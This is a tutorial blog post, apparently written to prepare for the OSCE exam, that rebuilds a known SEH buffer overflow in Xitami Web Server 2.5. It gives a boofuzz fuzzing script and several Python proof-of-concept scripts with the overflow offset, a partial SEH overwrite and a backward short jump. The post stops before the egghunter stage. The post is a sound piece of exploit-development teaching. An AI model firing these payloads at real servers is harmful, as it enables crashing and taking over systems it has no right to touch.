---
layout: single
title: CTP/OSCE Prep -- Xitami Webserver 2.5 SEH Overflow With Egghunter 
date: 2019-6-15
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
  - ExploitDB
  - egghunter
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

This particular post is about recreating an SEH Overwrite from an ExploitDB entry. **IF you've never done an SEH-based overflow, check out my [first post on the topic](https://h0mbre.github.io/SEH_Based_Exploit/#)!**

## Finding a Candidate Exploit

Searching ExploitDB for 'SEH' and one of the first entries is the [Xitami Web Server 2.5 SEH Overflow](https://www.exploit-db.com/exploits/46797). By glancing at the exploit it looks like it utilizes an egghunter and also stores the final shellcode separately from the payload that crashes the application. It also uses a partial overwrite for the Next SEH handler pointer. This should be a great exercise for us to troubleshoot our way through. You can download the application from [here](https://imatix-legacy.github.io/xitami.com/).

## Fuzzing

In the last post we fuzzed another HTTP service and the `boofuzz` script only really fuzzed the first part of the request header. I wanted a way to dynamically create `boofuzz` scripts based on the HTTP requests actually sent to the web application, so I created a script to do just that. 

### Introducing Boo-Gen!

[Boo-Gen is a simple Python script](https://github.com/h0mbre/CTP/tree/master/Boo-Gen) which uses an example HTTP request (right now just the headers) to generate a `boofuzz` script. It should function dynamically and work with any headers that follow a `Parameter: Value` paradigm. All you need is an example `.txt` file with your HTTP request.

First, we want to grab a template HTTP request for the web application. Using Burpsuite, I just browsed to the address of the webserver and grabbed the `GET` request and saved it to a file called `get.txt`. 

![](/assets/images/CTP/xitamiHome.JPG)

![](/assets/images/CTP/xitamiBurp.JPG)

Right-clicking anywhere in the `GET` request and selecting 'Copy to file' within Burp allows us to save the request a `.txt` file. Now we just need to feed this request to Boo-Gen and let it do its thing. We will not specify an output file name with the `-f, --filename` flag and will instead let it default to `http.py`. 
```terminal
root@kali:~/OSCE/ # python boo-gen.py get.txt
```

We can now open the newly created `http.py` file and inspect its contents. 
```python
#!/usr/bin/env python
# Designed for use with boofuzz v0.0.9
from boofuzz import *


def main():
    session = Session(
        target=Target(
            connection=SocketConnection("127.0.0.1", 80, proto='tcp')
        ),
    )

    s_initialize(name="Request")
    with s_block("Request-Line"):
        s_group("Method", ['GET', 'POST'])
        s_delim(" ", name='space-1', fuzzable = False)
        s_string("/", name='Request-URI', fuzzable = False)
        s_delim(" ", name='space-2', fuzzable = False)
        s_string("HTTP/1.1", name='HTTP-Version', fuzzable = False)
	s_delim("\r\n", name='return-1', fuzzable = False)
	s_string("Host:", name="Host", fuzzable = False)
	s_delim(" ", name="space-3", fuzzable = False)
	s_string("192.168.1.201", name="Host-Value", fuzzable = False)
	s_delim("\r\n", name="return-2", fuzzable = False)
	s_string("User-Agent:", name="User-Agent", fuzzable = False)
	s_delim(" ", name="space-4", fuzzable = False)
	s_string("Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0", name="User-Agent-Value", fuzzable = False)
	s_delim("\r\n", name="return-3", fuzzable = False)
	s_string("Accept:", name="Accept", fuzzable = False)
	s_delim(" ", name="space-5", fuzzable = False)
	s_string("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", name="Accept-Value", fuzzable = False)
	s_delim("\r\n", name="return-4", fuzzable = False)
	s_string("Accept-Language:", name="Accept-Language", fuzzable = False)
	s_delim(" ", name="space-6", fuzzable = False)
	s_string("en-US,en;q=0.5", name="Accept-Language-Value", fuzzable = False)
	s_delim("\r\n", name="return-5", fuzzable = False)
	s_string("Accept-Encoding:", name="Accept-Encoding", fuzzable = False)
	s_delim(" ", name="space-7", fuzzable = False)
	s_string("gzip, deflate", name="Accept-Encoding-Value", fuzzable = False)
	s_delim("\r\n", name="return-6", fuzzable = False)
	s_string("Connection:", name="Connection", fuzzable = False)
	s_delim(" ", name="space-8", fuzzable = False)
	s_string("close", name="Connection-Value", fuzzable = False)
	s_delim("\r\n", name="return-7", fuzzable = False)
	s_string("Upgrade-Insecure-Requests:", name="Upgrade-Insecure-Requests", fuzzable = False)
	s_delim(" ", name="space-9", fuzzable = False)
	s_string("1", name="Upgrade-Insecure-Requests-Value", fuzzable = False)
	s_delim("\r\n", name="return-8", fuzzable = False)
	s_string("If-Modified-Since:", name="If-Modified-Since", fuzzable = False)
	s_delim(" ", name="space-10", fuzzable = False)
	s_string("Sat, 15 Jun 2019 01:36:09 GMT", name="If-Modified-Since-Value", fuzzable = False)
	s_delim("\r\n", name="return-9", fuzzable = False)
	s_string("Cache-Control:", name="Cache-Control", fuzzable = False)
	s_delim(" ", name="space-11", fuzzable = False)
	s_string("max-age=0", name="Cache-Control-Value", fuzzable = False)
	s_delim("\r\n", name="return-10", fuzzable = False)
        s_static("\r\n", name="Request-Line-CRLF")
    s_static("\r\n", "Request-CRLF")

    session.connect(s_get("Request"))

    session.fuzz()


if __name__ == "__main__":
    main()
```

Comparing this output file to our `get.txt` file and everything looks the way it should! Notice that everything right now is set to `fuzzable = False` which means, as is, our `boofuzz` script will only send requests that match our `get.txt` file. We will have manually enable fuzzing for each parameter we want to fuzz. This is just a personal taste, if you don't like this approach, feel free to just delete instances of `fuzzable = False` in `boo-gen.py`. *Also change the IP address and port if necessary :)*

### Getting Fuzzy 

After spending quite a long time fuzzing the application, I was unable to get it to crash. Eventually I had to peek at the ExploitDB PoC script and determine how they were able to make the application crash. It turns out the `If-Modified-Since` parameter in our `boofuzz` script **is** vulnerable; however, it actually requires the parameter value to be prepended by a day and a space. So it needs to look like this: `If-Modified-Since: Wed, <fuzzing-payload>`. 

So we need to alter our `boofuzz` script slightly, in particular these few lines:
```python
s_string("If-Modified-Since: Sat,", name="If-Modified-Since", fuzzable = False)
s_delim(" ", name="space-10", fuzzable = False)
s_string("15 Jun 2019 01:36:09 GMT", name="If-Modified-Since-Value")
```

`"If-Modified-Since"` now has the day included along with a comma. This entity will not be fuzzed as it's set to `fuzzable = False`. The `"If-Modified-Since-Value"` entity has been shortened and we have deleted the fuzzable declaration so now it will be fuzzed. 

Sending this to our webserver nets us our crash!

![](/assets/images/CTP/xitamiSad.JPG)

So, lesson learned on that one. Fuzzing is not always just about smashing applications with data, we should be intelligently fuzzing applications. Looking at the [Mozilla.org Documentation for 'If-Modified-Since'](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/If-Modified-Since), it looks like the overflow occurs on the '<day>' value, possibly due to some conversion process on the server side. (Huge thanks to firzen and v0idptr for their insights on this!)
	
So now that we have our crash, let's replicate it:
```python
import socket
import sys

host = "192.168.1.201"
port = 80

crash = "A" * 1000

req = "GET / HTTP/1.1\r\n"
req += "Host: 192.168.1.201\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "If-Modified-Since: Wed, " + crash + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()
```

This also nets us our crash and we can see that we have overwritten both 4 byte components of the SEH chain. 

![](/assets/images/CTP/SEHxitami.JPG)

## POP POP RET

At this point we know the drill. First we have to find our offset to the SEH overwrite and then let mona find us a `POP POP RET` address. Mona tells us that our offset is at 304. Let's ensure we are correct and send the following payload:
```python
import socket
import sys

host = "192.168.1.201"
port = 80

seh = "BBBB"
nseh = "CCCC"

#PO @ 304
crash = "A" * 304
crash += nseh
crash += seh
crash += "D" * (1000 -len(crash))


req = "GET / HTTP/1.1\r\n"
req += "Host: 192.168.1.201\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "If-Modified-Since: Wed, " + crash + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()
```

Looks like we were correct. 
![](/assets/images/CTP/xitamicorrect.JPG)

Time to find a `POP POP RET`. `!mona seh` nets us a small list of gadget addresses we can use; however, there is a problem. All of the addresses start with `00` which we cannot have in our shellcode. 

![](/assets/images/CTP/xitamiSEH.JPG)

The workaround here is that we need to overwrite only the first 3 bytes of the current SEH address and let the program fill in the nullbyte for us. To test this, let's send this payload with a 3 byte value for `seh`:
```python
import socket
import sys

host = "192.168.1.201"
port = 80

seh = "\x84\xf5\x44"
nseh = "CCCC"

#PO @ 304
crash = "A" * 304
crash += nseh
crash += seh
crash += "D" * (1000 -len(crash))


req = "GET / HTTP/1.1\r\n"
req += "Host: 192.168.1.201\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "If-Modified-Since: Wed, " + crash + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()
```

![](/assets/images/CTP/xitamipartial.JPG)

So we are almost there. We get a value of `4444f584` and we need `0044f584`. I couldn't immediately tell where that extra `44` byte came from but when I looked at the stack, it became apparent that it's from our `D` buffer! 

![](/assets/images/CTP/dbuffer.JPG)

Let's delete our `D` buffer from our payload and see what happens.
```python
import socket
import sys

host = "192.168.1.201"
port = 80

seh = "\x84\xf5\x44"
nseh = "CCCC"

#PO @ 304
crash = "A" * 304
crash += nseh
crash += seh


req = "GET / HTTP/1.1\r\n"
req += "Host: 192.168.1.201\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "If-Modified-Since: Wed, " + crash + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()
```

Resending this payload gets us our correct `POP POP RET` address overwritten into the current SEH!

![](/assets/images/CTP/xitamiwhoo.JPG)

![](/assets/images/CTP/xitaminoD.JPG)


### Why does this work? 

Well, let's see what the address is if we don't overwrite any part of it. Let's comment out our `seh` variable and just send the payload that crashes the application. 

![](/assets/images/CTP/nooverwrite.JPG)

As you can see, it currently holds the value `00450800`. This would translate to: `\x00\x08\x45\x00` in our script. So what we end up doing is just overwriting the `450800` value with our `seh` variable and let the `00` on the end remain giving us our valid address. 

## Jumping

After we take our `POP POP RET` we end up as planned in our `nseh` 4 byte space of `CCCC`. Unlike our normal situation where we jump over the current SEH and into our `D` buffer, we will have to jump backwards since there is no `D` buffer for us to jump forward into. 

Let's first do some offset calcuations to see how large our buffer space is.

### Offset.py

To do our calculations, I created a [little offset helper script](https://github.com/h0mbre/CTP/tree/master/Offset). We will first need to examine the stack and see what we have to work with. 

![](/assets/images/CTP/xitamistack.JPG)

It looks like our `A` buffer begins at `0006FE48`; however, around `0006FE94` and `0006FEA4` we see that our buffer has been partially corrupted and filled with values of `00000055` and `FFFFFFFF`. So we'll have to make consider our `A` buffer as starting at `0006FEA4`. Let's let `offset.py` determine our distance from where we currently sit to the "top" of our `A` buffer. 

![](/assets/images/CTP/xitamistart.JPG)

We currently sit at `0006FF78` so let's feed these values to `offset.py`. 
```terminal_session
root@kali:~/OSCE/ # offset                                         
Enter Address #1: 6ff78
Enter Address #2: 6fea4
[+] Hex offset: 0xd4
[+] Decimal offset: 212
[-] ESP Sub Adjust Opcodes: \x54\x58\x2c\x6a\x2c\x6a\x50\x5c
[+] ESP Add Adjust Opcodes: \x54\x58\x04\x6a\x04\x6a\x50\x5c
```

The script tells us our offset is 212 and since this is beyond a short jump, we do not get any `JMP` opcodes back. 212 bytes is definitely not going to be enough for shellcode. We will have to use an egghunter. An egghunter is typically 32 bytes. Let's jump backwards 50 bytes to make sure we have enough space for the egghunter and some cushion to spare. Once again, we can use `offset.py`. 

This time, we use the `-j, --jump` flag to tell `offset.py` that we want to get opcodes for a short jump. We then tell it the offset in decimal that we want to achieve. 
```terminal_session
root@kali:~/OSCE/ # offset -j                                           
Enter offset in decimal: 50
[-] Negative jump opcodes: \xeb\xcc
[+] Positive jump opcodes: \xeb\x32
```

Excellent, `offset.py` gives us our negative jump codes and we can put this value into `nseh`. Let's update our exploit script. Note that we added NOPs to `nseh` just to pad out the rest of the 4 byte value. 
```python
import socket
import sys

host = "192.168.1.201"
port = 80

seh = "\x84\xf5\x44"
nseh = "\xeb\xcc\x90\x90"

#PO @ 304
crash = "A" * 304
crash += nseh
crash += seh


req = "GET / HTTP/1.1\r\n"
req += "Host: 192.168.1.201\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "If-Modified-Since: Wed, " + crash + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()
```

--TO BE CONTINUED--


## Resources

+ [h0mbre's First SEH Overflow](https://h0mbre.github.io/SEH_Based_Exploit/#)
+ [Xitami Download](https://imatix-legacy.github.io/xitami.com/)
+ [Boo-Gen](https://github.com/h0mbre/CTP/tree/master/Boo-Gen)
+ [Offset.py](https://github.com/h0mbre/CTP/tree/master/Offset)
